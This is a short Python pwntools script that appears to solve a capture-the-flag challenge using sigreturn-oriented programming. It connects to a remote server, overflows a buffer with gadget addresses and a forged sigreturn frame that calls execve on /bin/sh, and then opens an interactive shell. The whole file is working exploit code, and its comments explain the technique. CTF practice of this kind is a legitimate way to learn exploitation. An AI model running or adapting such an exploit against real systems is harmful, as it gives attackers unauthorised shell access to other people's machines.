#!/usr/bin/env python

#A simple SROP challenge we obviously have a huge buffer overflow
#We have a  /bin/sh string in .data section and also pop rax gadget
#We just have to make sigreturn syscall to control all gadgets 
#And then return back to syscall gadget to get a shell


from pwn import *


r = remote("193.57.159.27",23866)
context.clear(arch="amd64")
def Frame():
    frame = SigreturnFrame(kernel="amd64")
    frame.rax = 0x3b
    frame.rdi = 0x402000
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = 0x40102b
    frame.rsp = 0x402000
    frame.rbp = 0x402000
    return bytes(frame)


Frame1 = Frame()
payload = 'A' * 8 + p64(0x40103f) + p64(15) + p64(0x40102b)  + Frame1
r.sendline(payload)
r.interactive()
